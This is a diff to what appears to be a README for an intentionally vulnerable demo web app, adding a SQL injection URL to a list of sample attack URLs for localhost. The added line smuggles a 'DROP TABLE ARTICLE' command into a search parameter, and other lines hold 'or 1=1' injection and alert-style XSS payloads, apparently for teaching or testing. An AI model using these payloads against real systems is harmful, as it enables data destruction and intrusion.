@@ -23,6 +23,7 @@ In your browser go to:
 
 To try some SQL Injection and XSS attacks, use the following:
 
+* http://localhost:8080/vulnerable?searchterm=Gold%%27;%20DROP%20TABLE%20ARTICLE
 * http://localhost:8080/?searchterm=1%27%20or%201=1%20--
 * http://localhost:8080/?searchterm=1%27%20or%201=1%20%3Cscript%3Ealert(1)%3C/script%3E
 * http://localhost:8080/?searchterm=1%27%20or%201=1%20%3Cimg%20src%3D%22x%22%20onerror%3Dalert(1)%3E
